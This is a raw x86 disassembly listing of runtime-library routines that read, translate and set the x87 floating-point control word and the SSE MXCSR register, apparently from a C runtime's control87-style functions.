  4289af:	int3   
  4289b0:	push   ebp
  4289b1:	mov    ebp,esp
  4289b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4289b6:	xor    eax,eax
  4289b8:	test   cl,0x10
  4289bb:	je     0x4289c2
  4289bd:	mov    eax,0x80
  4289c2:	push   ebx
  4289c3:	push   esi
  4289c4:	push   edi
  4289c5:	mov    edi,0x200
  4289ca:	test   cl,0x8
  4289cd:	je     0x4289d1
  4289cf:	or     eax,edi
  4289d1:	test   cl,0x4
  4289d4:	je     0x4289db
  4289d6:	or     eax,0x400
  4289db:	test   cl,0x2
  4289de:	je     0x4289e5
  4289e0:	or     eax,0x800
  4289e5:	test   cl,0x1
  4289e8:	je     0x4289ef
  4289ea:	or     eax,0x1000
  4289ef:	mov    esi,0x100
  4289f4:	test   ecx,0x80000
  4289fa:	je     0x4289fe
  4289fc:	or     eax,esi
  4289fe:	mov    edx,ecx
  428a00:	mov    ebx,0x300
  428a05:	and    edx,ebx
  428a07:	je     0x428a28
  428a09:	cmp    edx,esi
  428a0b:	je     0x428a23
  428a0d:	cmp    edx,edi
  428a0f:	je     0x428a1c
  428a11:	cmp    edx,ebx
  428a13:	jne    0x428a28
  428a15:	or     eax,0x6000
  428a1a:	jmp    0x428a28
  428a1c:	or     eax,0x4000
  428a21:	jmp    0x428a28
  428a23:	or     eax,0x2000
  428a28:	mov    edx,0x3000000
  428a2d:	pop    edi
  428a2e:	and    ecx,edx
  428a30:	pop    esi
  428a31:	pop    ebx
  428a32:	cmp    ecx,0x1000000
  428a38:	je     0x428a52
  428a3a:	cmp    ecx,0x2000000
  428a40:	je     0x428a4d
  428a42:	cmp    ecx,edx
  428a44:	jne    0x428a57
  428a46:	or     eax,0x8000
  428a4b:	pop    ebp
  428a4c:	ret    
  428a4d:	or     eax,0x40
  428a50:	pop    ebp
  428a51:	ret    
  428a52:	or     eax,0x8040
  428a57:	pop    ebp
  428a58:	ret    
  428a59:	push   ebp
  428a5a:	mov    ebp,esp
  428a5c:	sub    esp,0xc
  428a5f:	fstcw  WORD PTR [ebp-0x4]
  428a63:	mov    ax,WORD PTR [ebp-0x4]
  428a67:	xor    ecx,ecx
  428a69:	test   al,0x1
  428a6b:	je     0x428a70
  428a6d:	push   0x10
  428a6f:	pop    ecx
  428a70:	test   al,0x4
  428a72:	je     0x428a77
  428a74:	or     ecx,0x8
  428a77:	test   al,0x8
  428a79:	je     0x428a7e
  428a7b:	or     ecx,0x4
  428a7e:	test   al,0x10
  428a80:	je     0x428a85
  428a82:	or     ecx,0x2
  428a85:	test   al,0x20
  428a87:	je     0x428a8c
  428a89:	or     ecx,0x1
  428a8c:	test   al,0x2
  428a8e:	je     0x428a96
  428a90:	or     ecx,0x80000
  428a96:	push   ebx
  428a97:	push   esi
  428a98:	movzx  esi,ax
  428a9b:	mov    ebx,0xc00
  428aa0:	mov    edx,esi
  428aa2:	push   edi
  428aa3:	mov    edi,0x200
  428aa8:	and    edx,ebx
  428aaa:	je     0x428ad2
  428aac:	cmp    edx,0x400
  428ab2:	je     0x428acc
  428ab4:	cmp    edx,0x800
  428aba:	je     0x428ac8
  428abc:	cmp    edx,ebx
  428abe:	jne    0x428ad2
  428ac0:	or     ecx,0x300
  428ac6:	jmp    0x428ad2
  428ac8:	or     ecx,edi
  428aca:	jmp    0x428ad2
  428acc:	or     ecx,0x100
  428ad2:	and    esi,0x300
  428ad8:	je     0x428ae6
  428ada:	cmp    esi,edi
  428adc:	jne    0x428aec
  428ade:	or     ecx,0x10000
  428ae4:	jmp    0x428aec
  428ae6:	or     ecx,0x20000
  428aec:	movzx  eax,ax
  428aef:	mov    edx,0x1000
  428af4:	test   edx,eax
  428af6:	je     0x428afe
  428af8:	or     ecx,0x40000
  428afe:	mov    edi,DWORD PTR [ebp+0xc]
  428b01:	mov    esi,edi
  428b03:	mov    eax,DWORD PTR [ebp+0x8]
  428b06:	not    esi
  428b08:	and    esi,ecx
  428b0a:	and    eax,edi
  428b0c:	or     esi,eax
  428b0e:	cmp    esi,ecx
  428b10:	je     0x428bbc
  428b16:	push   esi
  428b17:	call   0x428d5b
  428b1c:	movzx  eax,ax
  428b1f:	pop    ecx
  428b20:	mov    DWORD PTR [ebp-0x8],eax
  428b23:	fldcw  WORD PTR [ebp-0x8]
  428b26:	fstcw  WORD PTR [ebp-0x8]
  428b2a:	mov    eax,DWORD PTR [ebp-0x8]
  428b2d:	xor    esi,esi
  428b2f:	test   al,0x1
  428b31:	je     0x428b36
  428b33:	push   0x10
  428b35:	pop    esi
  428b36:	test   al,0x4
  428b38:	je     0x428b3d
  428b3a:	or     esi,0x8
  428b3d:	test   al,0x8
  428b3f:	je     0x428b44
  428b41:	or     esi,0x4
  428b44:	test   al,0x10
  428b46:	je     0x428b4b
  428b48:	or     esi,0x2
  428b4b:	test   al,0x20
  428b4d:	je     0x428b52
  428b4f:	or     esi,0x1
  428b52:	test   al,0x2
  428b54:	je     0x428b5c
  428b56:	or     esi,0x80000
  428b5c:	movzx  edx,ax
  428b5f:	mov    ecx,edx
  428b61:	and    ecx,ebx
  428b63:	je     0x428b8f
  428b65:	cmp    ecx,0x400
  428b6b:	je     0x428b89
  428b6d:	cmp    ecx,0x800
  428b73:	je     0x428b81
  428b75:	cmp    ecx,ebx
  428b77:	jne    0x428b8f
  428b79:	or     esi,0x300
  428b7f:	jmp    0x428b8f
  428b81:	or     esi,0x200
  428b87:	jmp    0x428b8f
  428b89:	or     esi,0x100
  428b8f:	and    edx,0x300
  428b95:	je     0x428ba7
  428b97:	cmp    edx,0x200
  428b9d:	jne    0x428bad
  428b9f:	or     esi,0x10000
  428ba5:	jmp    0x428bad
  428ba7:	or     esi,0x20000
  428bad:	mov    edx,0x1000
  428bb2:	test   edx,eax
  428bb4:	je     0x428bbc
  428bb6:	or     esi,0x40000
  428bbc:	cmp    DWORD PTR ds:0x432b20,0x1
  428bc3:	jl     0x428d52
  428bc9:	and    edi,0x308031f
  428bcf:	stmxcsr DWORD PTR [ebp-0xc]
  428bd3:	mov    eax,DWORD PTR [ebp-0xc]
  428bd6:	xor    ecx,ecx
  428bd8:	test   al,al
  428bda:	jns    0x428bdf
  428bdc:	push   0x10
  428bde:	pop    ecx
  428bdf:	test   eax,0x200
  428be4:	je     0x428be9
  428be6:	or     ecx,0x8
  428be9:	test   eax,0x400
  428bee:	je     0x428bf3
  428bf0:	or     ecx,0x4
  428bf3:	test   eax,0x800
  428bf8:	je     0x428bfd
  428bfa:	or     ecx,0x2
  428bfd:	test   edx,eax
  428bff:	je     0x428c04
  428c01:	or     ecx,0x1
  428c04:	test   eax,0x100
  428c09:	je     0x428c11
  428c0b:	or     ecx,0x80000
  428c11:	mov    edx,eax
  428c13:	mov    ebx,0x6000
  428c18:	and    edx,ebx
  428c1a:	je     0x428c46
  428c1c:	cmp    edx,0x2000
  428c22:	je     0x428c40
  428c24:	cmp    edx,0x4000
  428c2a:	je     0x428c38
  428c2c:	cmp    edx,ebx
  428c2e:	jne    0x428c46
  428c30:	or     ecx,0x300
  428c36:	jmp    0x428c46
  428c38:	or     ecx,0x200
  428c3e:	jmp    0x428c46
  428c40:	or     ecx,0x100
  428c46:	push   0x40
  428c48:	and    eax,0x8040
  428c4d:	pop    ebx
  428c4e:	sub    eax,ebx
  428c50:	je     0x428c6d
  428c52:	sub    eax,0x7fc0
  428c57:	je     0x428c65
  428c59:	sub    eax,ebx
  428c5b:	jne    0x428c73
  428c5d:	or     ecx,0x1000000
  428c63:	jmp    0x428c73
  428c65:	or     ecx,0x3000000
  428c6b:	jmp    0x428c73
  428c6d:	or     ecx,0x2000000
  428c73:	mov    eax,edi
  428c75:	and    edi,DWORD PTR [ebp+0x8]
  428c78:	not    eax
  428c7a:	and    eax,ecx
  428c7c:	or     eax,edi
  428c7e:	cmp    eax,ecx
  428c80:	je     0x428d3b
  428c86:	push   eax
  428c87:	call   0x4289b0
  428c8c:	push   eax
  428c8d:	mov    DWORD PTR [ebp+0xc],eax
  428c90:	call   0x428df2
  428c95:	pop    ecx
  428c96:	pop    ecx
  428c97:	stmxcsr DWORD PTR [ebp+0xc]
  428c9b:	mov    eax,DWORD PTR [ebp+0xc]
  428c9e:	xor    ecx,ecx
  428ca0:	test   al,al
  428ca2:	jns    0x428ca7
  428ca4:	push   0x10
  428ca6:	pop    ecx
  428ca7:	test   eax,0x200
  428cac:	je     0x428cb1
  428cae:	or     ecx,0x8
  428cb1:	test   eax,0x400
  428cb6:	je     0x428cbb
  428cb8:	or     ecx,0x4
  428cbb:	test   eax,0x800
  428cc0:	je     0x428cc5
  428cc2:	or     ecx,0x2
  428cc5:	test   eax,0x1000
  428cca:	je     0x428ccf
  428ccc:	or     ecx,0x1
  428ccf:	test   eax,0x100
  428cd4:	je     0x428cdc
  428cd6:	or     ecx,0x80000
  428cdc:	mov    edx,eax
  428cde:	mov    edi,0x6000
  428ce3:	and    edx,edi
  428ce5:	je     0x428d11
  428ce7:	cmp    edx,0x2000
  428ced:	je     0x428d0b
  428cef:	cmp    edx,0x4000
  428cf5:	je     0x428d03
  428cf7:	cmp    edx,edi
  428cf9:	jne    0x428d11
  428cfb:	or     ecx,0x300
  428d01:	jmp    0x428d11
  428d03:	or     ecx,0x200
  428d09:	jmp    0x428d11
  428d0b:	or     ecx,0x100
  428d11:	and    eax,0x8040
  428d16:	sub    eax,ebx
  428d18:	je     0x428d35
  428d1a:	sub    eax,0x7fc0
  428d1f:	je     0x428d2d
  428d21:	sub    eax,ebx
  428d23:	jne    0x428d3b
  428d25:	or     ecx,0x1000000
  428d2b:	jmp    0x428d3b
  428d2d:	or     ecx,0x3000000
  428d33:	jmp    0x428d3b
  428d35:	or     ecx,0x2000000
  428d3b:	mov    eax,ecx
  428d3d:	or     ecx,esi
  428d3f:	xor    eax,esi
  428d41:	test   eax,0x8031f
  428d46:	je     0x428d4e
  428d48:	or     ecx,0x80000000
  428d4e:	mov    eax,ecx
  428d50:	jmp    0x428d54
  428d52:	mov    eax,esi
  428d54:	pop    edi
  428d55:	pop    esi
  428d56:	pop    ebx
  428d57:	mov    esp,ebp
  428d59:	pop    ebp
  428d5a:	ret    
  428d5b:	push   ebp
  428d5c:	mov    ebp,esp
  428d5e:	mov    ecx,DWORD PTR [ebp+0x8]
  428d61:	xor    eax,eax
  428d63:	test   cl,0x10
  428d66:	je     0x428d69
  428d68:	inc    eax
  428d69:	test   cl,0x8
  428d6c:	je     0x428d71
  428d6e:	or     eax,0x4
  428d71:	test   cl,0x4
  428d74:	je     0x428d79
  428d76:	or     eax,0x8
  428d79:	test   cl,0x2
  428d7c:	je     0x428d81
  428d7e:	or     eax,0x10
  428d81:	test   cl,0x1
  428d84:	je     0x428d89
  428d86:	or     eax,0x20
  428d89:	test   ecx,0x80000
  428d8f:	je     0x428d94
  428d91:	or     eax,0x2
  428d94:	push   esi
  428d95:	mov    edx,ecx
  428d97:	mov    esi,0x300
  428d9c:	push   edi
  428d9d:	mov    edi,0x200
  428da2:	and    edx,esi
  428da4:	je     0x428dc9
  428da6:	cmp    edx,0x100
  428dac:	je     0x428dc4
  428dae:	cmp    edx,edi
  428db0:	je     0x428dbd
  428db2:	cmp    edx,esi
  428db4:	jne    0x428dc9
  428db6:	or     eax,0xc00
  428dbb:	jmp    0x428dc9
  428dbd:	or     eax,0x800
  428dc2:	jmp    0x428dc9
  428dc4:	or     eax,0x400
  428dc9:	mov    edx,ecx
  428dcb:	and    edx,0x30000
  428dd1:	je     0x428ddf
  428dd3:	cmp    edx,0x10000
  428dd9:	jne    0x428de1
  428ddb:	or     eax,edi
  428ddd:	jmp    0x428de1
  428ddf:	or     eax,esi
  428de1:	pop    edi
  428de2:	pop    esi
  428de3:	test   ecx,0x40000
  428de9:	je     0x428df0
  428deb:	or     eax,0x1000
  428df0:	pop    ebp
  428df1:	ret    
  428df2:	push   0x8
  428df4:	push   0x42dc60
  428df9:	call   0x4221c0
  428dfe:	cmp    DWORD PTR ds:0x432b20,0x1
  428e05:	jl     0x428e62
  428e07:	mov    eax,DWORD PTR [ebp+0x8]
  428e0a:	test   al,0x40
  428e0c:	je     0x428e58
  428e0e:	cmp    DWORD PTR ds:0x4318c8,0x0
  428e15:	je     0x428e58
  428e17:	and    DWORD PTR [ebp-0x4],0x0
  428e1b:	ldmxcsr DWORD PTR [ebp+0x8]
  428e1f:	jmp    0x428e4f
  428e21:	mov    eax,DWORD PTR [ebp-0x14]
  428e24:	mov    eax,DWORD PTR [eax]
  428e26:	cmp    DWORD PTR [eax],0xc0000005
  428e2c:	je     0x428e39
  428e2e:	cmp    DWORD PTR [eax],0xc000001d
  428e34:	je     0x428e39
  428e36:	xor    eax,eax
  428e38:	ret    
  428e39:	xor    eax,eax
  428e3b:	inc    eax
  428e3c:	ret    
  428e3d:	mov    esp,DWORD PTR [ebp-0x18]
  428e40:	and    DWORD PTR ds:0x4318c8,0x0
  428e47:	and    DWORD PTR [ebp+0x8],0xffffffbf
  428e4b:	ldmxcsr DWORD PTR [ebp+0x8]
  428e4f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  428e56:	jmp    0x428e62
  428e58:	and    eax,0xffffffbf
  428e5b:	mov    DWORD PTR [ebp+0x8],eax
  428e5e:	ldmxcsr DWORD PTR [ebp+0x8]
  428e62:	call   0x422205
  428e67:	ret    
